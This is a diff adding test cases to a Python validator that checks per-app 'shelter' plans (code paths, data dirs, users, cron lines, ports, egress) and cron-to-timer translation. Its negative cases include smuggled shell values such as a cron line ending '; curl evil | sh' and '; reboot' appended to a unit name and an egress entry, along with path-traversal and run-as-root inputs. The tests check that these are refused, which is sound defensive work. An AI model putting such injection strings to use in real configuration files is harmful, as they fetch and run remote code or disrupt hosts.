@@ -311,6 +311,56 @@ for name, vm, want in (("the web box's own [vm]", web.get("vm", {}), False),
     errs = check.check_box({**web, "vm": vm}, adapters, "boxes/el/centos5-web/box.toml")
     print(("refused " if errs else "passed  ") + name if bool(errs) == want else f"WRONG   {name} {errs}")
     bad += bool(errs) != want
+# a box's [shelter.<app>] plan (SPEC "Sheltering an app"): every value lands in root commands and unit files
+py = check.load_all()[3]["el/centos7-lamp"]  # any EL7 box: the plan below is what el/centos7-pyapp carries
+plan = {"code": "/opt/billing", "data": ["/var/lib/billing"], "user": "billing", "unit": "billing.service",
+        "cron": [{"user": "billing", "line": "30 2 * * * /usr/bin/python /opt/billing/nightly.py"}],
+        "sockets": ["/var/lib/mysql/mysql.sock"], "ports": ["127.0.0.1:8080"]}
+cron0 = plan["cron"][0]
+for name, sh, want in (
+        ("the pyapp box's own plan", {"billing": plan}, False),
+        ("shelter: not a table of apps", {"code": "/opt/billing"}, True),
+        ("shelter: an app name with a space", {"bill ing": plan}, True),
+        ("shelter: an unknown key (a privileged container)", {"billing": {**plan, "privileged": True}}, True),
+        ("shelter: no unit", {"billing": {k: v for k, v in plan.items() if k != "unit"}}, True),
+        ("shelter: shell in the unit name", {"billing": {**plan, "unit": "billing.service;reboot"}}, True),
+        ("shelter: a unit that is wend's own", {"billing": {**plan, "unit": "wend-shelter-billing.service"}}, True),
+        ("shelter: a relative code tree", {"billing": {**plan, "code": "opt/billing"}}, True),
+        ("shelter: the code tree is /usr", {"billing": {**plan, "code": "/usr/lib/python2.7"}}, True),
+        ("shelter: traversal in a data dir", {"billing": {**plan, "data": ["/var/lib/../../etc"]}}, True),
+        ("shelter: /etc as a data dir", {"billing": {**plan, "data": ["/etc"]}}, True),
+        ("shelter: data inside the code tree", {"billing": {**plan, "data": ["/opt/billing/state"]}}, True),
+        ("shelter: data as a string", {"billing": {**plan, "data": "/var/lib/billing"}}, True),
+        ("shelter: running as root", {"billing": {**plan, "user": "root"}}, True),
+        ("shelter: shell in a cron line", {"billing": {**plan, "cron": [
+            {**cron0, "line": cron0["line"] + "; curl evil | sh"}]}}, True),
+        ("shelter: a cron line with % (a newline to cron)", {"billing": {**plan, "cron": [
+            {**cron0, "line": "30 2 * * * /bin/date +%s"}]}}, True),
+        ("shelter: @reboot (no timer for it yet)", {"billing": {**plan, "cron": [
+            {**cron0, "line": "@reboot /usr/bin/python /opt/billing/nightly.py"}]}}, True),
+        ("shelter: a stepped range (doesn't translate exactly)", {"billing": {**plan, "cron": [
+            {**cron0, "line": "1-30/5 2 * * * /usr/bin/python /opt/billing/nightly.py"}]}}, True),
+        ("shelter: a cron line with a bare command", {"billing": {**plan, "cron": [
+            {**cron0, "line": "30 2 * * * python /opt/billing/nightly.py"}]}}, True),
+        ("shelter: a cron line of another user", {"billing": {**plan, "cron": [{**cron0, "user": "alice"}]}}, True),
+        ("shelter: a cron line as a string", {"billing": {**plan, "cron": [cron0["line"]]}}, True),
+        ("shelter: a relative socket", {"billing": {**plan, "sockets": ["mysql.sock"]}}, True),
+        ("shelter: a port out of range", {"billing": {**plan, "ports": ["127.0.0.1:99999"]}}, True),
+        ("shelter: a port with no address", {"billing": {**plan, "ports": [8080]}}, True),
+        ("shelter: an egress opt-in", {"billing": {**plan, "egress": ["192.0.2.10:443"]}}, False),
+        ("shelter: egress as a host name", {"billing": {**plan, "egress": ["api.example.com:443"]}}, True),
+        ("shelter: egress with shell", {"billing": {**plan, "egress": ["192.0.2.10:443; reboot"]}}, True)):
+    errs = check.check_box({**py, "shelter": sh}, adapters, "boxes/el/centos7-lamp/box.toml")
+    print(("refused " if errs else "passed  ") + name if bool(errs) == want else f"WRONG   {name} {errs}")
+    bad += bool(errs) != want
+# cron schedules as timers: both day fields restricted means either, unless one starts with * (cronie: both)
+import shelter  # noqa: E402
+for line, want in (("30 2 1,15 * 1 /x", ["*-*-01,15 02:30:00", "Mon *-*-* 02:30:00"]),
+                   ("30 2 */2 * 1 /x", ["Mon *-*-1/2 02:30:00"]),
+                   ("30 2 * * mon-fri /x", ["Mon,Tue,Wed,Thu,Fri *-*-* 02:30:00"])):
+    got = shelter.cron_calendar(line)[0]
+    print(("passed  " if got == want else f"WRONG   {got} ") + f"cron {line!r}")
+    bad += got != want
 # root_fs is one the box's start release's installer makes (releases.<release>.install.root_fs)
 lamp, trusty = check.load_all()[3]["el/centos7-lamp"], check.load_all()[3]["ubuntu/trusty-web"]
 for name, box, root_fs, want in (("[vm] root_fs xfs-v4 on CentOS 7", lamp, "xfs-v4", False),
